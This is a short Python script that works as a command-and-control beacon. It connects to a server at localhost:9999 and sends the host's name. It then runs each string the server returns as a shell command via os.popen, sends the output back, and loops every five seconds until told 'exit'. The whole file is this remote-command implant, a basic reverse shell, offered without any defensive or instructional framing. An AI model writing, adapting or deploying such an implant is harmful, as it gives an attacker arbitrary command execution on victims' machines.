import socket
import time
import os

HOST, PORT = "localhost", 9999
#data = " ".join(sys.argv[1:])
data = os.popen('echo $($env:ComputerName)').read()

Loop = True

while(Loop):

    # Create a socket (SOCK_STREAM means a TCP socket)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        # Connect to server and send data
        sock.connect((HOST, PORT))
        sock.sendall(bytes(data + "\n", "utf-8"))

        # Receive data from the server and shut down
        received = str(sock.recv(2048), "utf-8")

        if received == "exit":
            Loop = False

        c2command = os.popen(received).read()
        sock.sendall(bytes(c2command + "\n", "utf-8"))

        time.sleep(5)

